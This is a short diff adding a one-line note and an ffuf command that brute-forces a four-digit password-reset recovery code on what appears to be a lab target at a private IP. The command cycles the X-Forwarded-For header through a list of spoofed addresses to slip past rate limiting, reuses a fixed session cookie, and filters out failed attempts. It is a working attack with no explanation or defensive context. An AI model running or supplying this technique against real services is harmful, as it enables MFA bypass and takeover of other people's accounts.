@@ -1,0 +1,5 @@
+this is an example of using ffuf to breach MFA in a four digit code.
+
+ffuf -w count-9999.txt:W1 -w fake_ip_cut.txt:W2 -u "http://10.10.207.147:1337/reset_password.php" -X "POST" -d "recovery_code=W1&s=80" -b "PHPSESSID=besq86q697ohn2jssj0h2kh8tu" -H "X-Forwarded-For: W2" -H "Content-Type: application/x-www-form-urlencoded" -fr "Invalid" -mode pitchfork -fw 1 -rate 100 -o output.txt
+
+
